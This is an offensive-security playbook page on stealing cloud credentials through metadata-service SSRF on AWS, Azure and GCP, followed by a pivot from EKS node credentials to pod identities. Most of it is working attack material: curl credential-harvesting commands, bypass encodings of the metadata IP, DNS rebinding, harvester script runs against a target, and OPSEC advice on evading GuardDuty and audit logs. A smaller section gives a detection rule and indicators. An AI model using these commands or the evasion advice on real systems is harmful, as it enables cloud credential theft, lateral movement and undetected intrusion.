# IMDS / Cloud Metadata SSRF & EKS Identity Pivot

CWE-918 (SSRF), CWE-552 (Files Accessible to External Parties), CWE-668 (Exposure to Wrong Sphere),
CWE-1188 (Insecure Default). ATT&CK: T1552.005 (Cloud Instance Metadata API),
T1552.007 (Container API), T1606.002 (Forge Web Credentials: SAML/Tokens), T1078.004.

## Theory / Mechanism

Every major cloud exposes a **link-local metadata endpoint** to compute instances that, among
other things, hands out the IAM/identity credentials of the role attached to that instance. The
endpoint is reachable from inside the instance with no auth, so any **SSRF** or **command
injection** in a workload running there becomes credential theft.

| Provider | Endpoint | Credential path |
|----------|----------|-----------------|
| AWS | `169.254.169.254` | `/latest/meta-data/iam/security-credentials/<role>` |
| Azure | `169.254.169.254` | `/metadata/identity/oauth2/token` (header `Metadata: true`) |
| GCP | `metadata.google.internal` (169.254.169.254) | `/computeMetadata/v1/instance/service-accounts/default/token` (header `Metadata-Flavor: Google`) |

### AWS IMDSv1 vs IMDSv2

- **IMDSv1**: plain `GET`, no auth → any SSRF that does a `GET` leaks creds (this is the Capital
  One 2019 breach pattern, still actively exploited per F5 Labs/Mandiant 2024-2025 scans).
- **IMDSv2**: session-oriented. You must `PUT /latest/api/token` with header
  `X-aws-ec2-metadata-token-ttl-seconds`, then send the returned token in
  `X-aws-ec2-metadata-token` on every `GET`. Most SSRF primitives cannot do a `PUT` with custom
  headers, so IMDSv2 mitigates simple SSRF. A default **hop limit of 1** stops the token response
  from traversing a container/proxy hop.

## Working exploitation

```bash
# --- AWS IMDSv1 (or v2 from inside the box) ---
# v1 single GET (works via plain SSRF):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
#   -> {"AccessKeyId":..., "SecretAccessKey":..., "Token":..., "Expiration":...}

# v2 (PUT-then-GET, requires header control / on-host exec):
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# --- Azure Managed Identity token ---
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Swap resource= for graph.microsoft.com, vault.azure.net, storage.azure.com, etc.

# --- GCP service-account token ---
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
```

Automate (handles v1/v2, SSRF-prefix injection, all three clouds, prints ready-to-use env):

```bash
python3 ../scripts/imds_harvester.py --ssrf "https://app.target/proxy?url=" --provider aws
python3 ../scripts/imds_harvester.py --local --provider gcp
python3 ../scripts/imds_harvester.py --local --provider azure --resource https://vault.azure.net/
```

## SSRF bypass tricks (when a filter blocks `169.254.169.254`)

```text
# Alternate IP encodings of 169.254.169.254
http://0xa9.0xfe.0xa9.0xfe/      # full hex
http://0251.0376.0251.0376/      # octal
http://2852039166/               # decimal (dword)
http://[::ffff:169.254.169.254]/ # IPv4-mapped IPv6
http://169.254.169.254.nip.io/   # wildcard DNS that resolves to the literal IP

# DNS rebinding (defeats allow-lists + can sidestep external hop limits):
#   attacker domain TTL=0; first resolution -> allowed IP (passes filter),
#   second resolution -> 169.254.169.254 (the actual fetch). Reuse of the
#   HTTP connection from inside the instance avoids decrementing the hop limit.

# Redirect-based: SSRF that follows 30x -> point a controlled URL at the metadata IP.
# AWS-friendly enhanced path (alias avoids needing the role name):
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # then /<role>
```

## Modern 2024-2026: EKS node-cred → IRSA / Pod Identity pivot (Datadog Security Labs)

In EKS, SSRF/command-injection in a pod is exploitable by default because **IMDSv2 usage is not
enforced on worker nodes**, and even when it is, a pod with command execution can simply perform
the PUT-then-GET itself and steal the **node's** instance-role credentials. That is the symptom;
the real problem is that a pod can reach AWS creds of its underlying node at all.

The dangerous escalation: once you hold the node's credentials, you authenticate **as the node**
and can mint Kubernetes ServiceAccount tokens for **any pod scheduled on that node**, then exchange
those tokens (via the EKS OIDC provider) for the AWS credentials of **every IRSA / Pod-Identity
pod on the node** — lateral movement from one compromised workload to many cloud identities.

```bash
# From a compromised pod with command exec, even if node enforces IMDSv2:
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# -> node instance-role creds. Now act as the node to enumerate/abuse co-located pod identities.

# Audit the full chain (IRSA + Pod Identity) with MKAT:
mkat eks find-secrets
mkat eks test-imds-access           # confirms pods can reach IMDS
mkat eks find-role-relationships    # node role -> assumable pod roles
```

Note: IRSA/Pod-Identity pods get creds from the **EKS OIDC provider**, *not* IMDS — so they are
unaffected by IMDSv2 enforcement directly. The pods that fall back to the **node instance role**
are the ones an SSRF directly compromises; the node-cred→token pivot is what reaches the rest.

## Detection

```yaml
title: Suspicious Access to Cloud Instance Metadata Service
id: c2b1a4e0-imds-ssrf
status: experimental
logsource:
  category: network_connection
detection:
  selection:
    DestinationIp: '169.254.169.254'
  context_web_tier:    # connection from a process that should not talk to IMDS
    Image|endswith:
      - '/nginx'
      - '/python'
      - '/node'
      - '/java'
  condition: selection and context_web_tier
level: high
falsepositives: [SDK credential refresh on app servers — baseline expected callers]
```

- **AWS**: GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS` and
  `.OutsideAWS` fire when instance-role creds are used from a different instance / external IP —
  the strongest signal. VPC flow logs to 169.254.169.254 from the web tier.
- **Azure**: token requests via IMDS that don't match the resource's normal pattern; the same
  access token seen from multiple/non-Azure IPs (Hunters/Team Axon MI-abuse indicators).
- **GCP**: Data Access audit logs for unusual `accessToken` minting / SA usage off-instance.

IOCs: metadata creds (recognizable session token / `ASIA...` AWS key) appearing from a new ASN;
`X-aws-ec2-metadata-token` PUT from a web process; outbound to nip.io / dword-encoded IPs.

## OPSEC

- Stolen instance-role / MI / SA creds are **short-lived** (minutes–hours). Use them fast and
  re-harvest; don't try to make them long-lived.
- Using creds from the **same egress IP** as the instance avoids the GuardDuty "InstanceCredential
  Exfiltration" cross-IP signal (e.g. pivot through the box, SOCKS proxy out the instance).
- Don't disable IMDS or change hop limits — config changes are logged (`ModifyInstanceMetadataOptions`).
- On EKS, enumerating co-located pod tokens touches the kube API (audit-logged); scope queries to
  the namespaces you actually need.

## References

- Datadog Security Labs, "Attacking and securing cloud identities in managed Kubernetes part 1: Amazon EKS" — https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/
- Datadog Security Labs, "Misconfiguration Spotlight: Securing the EC2 Instance Metadata Service" — https://securitylabs.datadoghq.com/articles/misconfiguration-spotlight-imds/
- Hacking The Cloud, "Steal EC2 Metadata Credentials via SSRF" — https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/
- F5 Labs, "Campaign Targets Amazon EC2 Instance Metadata via SSRF" (2025) — https://www.f5.com/labs/articles/campaign-targets-amazon-ec2-instance-metadata-via-ssrf
- MKAT (Managed Kubernetes Auditing Toolkit) — https://github.com/DataDog/managed-kubernetes-auditing-toolkit
